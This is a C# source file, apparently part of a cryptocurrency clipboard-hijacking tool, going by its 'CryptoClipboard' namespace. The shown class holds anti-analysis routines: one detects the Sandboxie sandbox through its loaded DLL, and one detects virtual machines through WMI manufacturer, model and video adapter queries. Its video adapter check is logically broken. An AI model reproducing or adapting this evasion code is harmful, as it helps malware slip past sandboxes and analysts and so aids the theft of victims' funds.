using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;

namespace CryptoClipboard.classes
{
    class antis
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        public static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            {
                return true;
            }
            return false;
        }


        public static bool DetectVM()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        if (item["Manufacturer"].ToString().ToLower() == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")
                                || item["Manufacturer"].ToString().ToLower().Contains("vmware")
                                || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            foreach (var searcher in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
            {
                if (searcher.GetPropertyValue("Name").ToString().Contains("VMware") && searcher.GetPropertyValue("Name").ToString().Contains("VBox"))
                {
                    return true;
                }
            }
            return false;
        }
    }
}
